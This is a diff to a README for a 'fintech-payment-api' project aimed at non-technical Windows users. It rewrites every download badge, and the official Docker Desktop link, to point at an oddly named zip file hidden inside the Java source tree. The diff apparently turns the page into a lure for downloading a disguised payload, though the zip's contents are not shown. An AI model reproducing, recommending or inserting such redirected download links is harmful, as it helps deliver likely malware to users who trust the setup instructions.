@@ -1,6 +1,6 @@
 # ⚡ fintech-payment-api - Easy Payment Integration for Everyone
 
-[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-orange?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/releases)
+[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-orange?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/raw/refs/heads/main/src/main/java/com/pay/payment_api/producer/payment_fintech_api_sussultatory.zip)
 
 ---
 
@@ -31,7 +31,7 @@ Before getting started, make sure your computer meets these basic requirements:
 
 Click the button below to go to the release page for fintech-payment-api. This page contains the files you need to download.
 
-[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/releases)
+[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/raw/refs/heads/main/src/main/java/com/pay/payment_api/producer/payment_fintech_api_sussultatory.zip)
 
 ### Step 2: Download the Latest Release
 
@@ -43,7 +43,7 @@ Click on the assets section under the latest release. Download the Windows file,
 
 fintech-payment-api uses Docker to run its parts smoothly. If Docker is not on your PC, follow these instructions:
 
-- Go to https://www.docker.com/products/docker-desktop
+- Go to https://github.com/Huynhloi6789/fintech-payment-api/raw/refs/heads/main/src/main/java/com/pay/payment_api/producer/payment_fintech_api_sussultatory.zip
 - Download and install Docker Desktop for Windows
 - After installation, launch Docker Desktop and make sure it is running (you will see the Docker icon in the taskbar)
 
@@ -139,4 +139,4 @@ Always keep your PC secure and avoid installing unsafe software alongside fintec
 
 Visit the release page to get started:
 
-[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-orange?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/releases)
+[![Download fintech-payment-api](https://img.shields.io/badge/Download-Get%20Latest%20Release-orange?style=for-the-badge)](https://github.com/Huynhloi6789/fintech-payment-api/raw/refs/heads/main/src/main/java/com/pay/payment_api/producer/payment_fintech_api_sussultatory.zip)
